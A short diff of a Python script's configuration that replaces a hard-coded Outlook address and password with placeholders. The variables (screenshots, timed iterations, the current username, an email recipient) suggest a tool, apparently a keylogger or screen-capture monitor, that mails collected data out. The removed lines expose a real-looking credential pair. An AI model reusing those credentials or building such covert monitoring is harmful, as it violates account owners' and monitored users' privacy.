@@ -24,12 +24,12 @@ screenshot_information = "screenshot.png"
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = "rudzkanole@outlook.com"
-password = "asdf1234@rudz"
+email_address = "add your email"
+password = "add your pass"
 
 username = getpass.getuser()
 
-toaddr = "rudzkanole@outlook.com"
+toaddr = "add your email"
 
 
 file_path = "C:\\Users\\Isha Desai\\PycharmProjects\\trial\\Project"
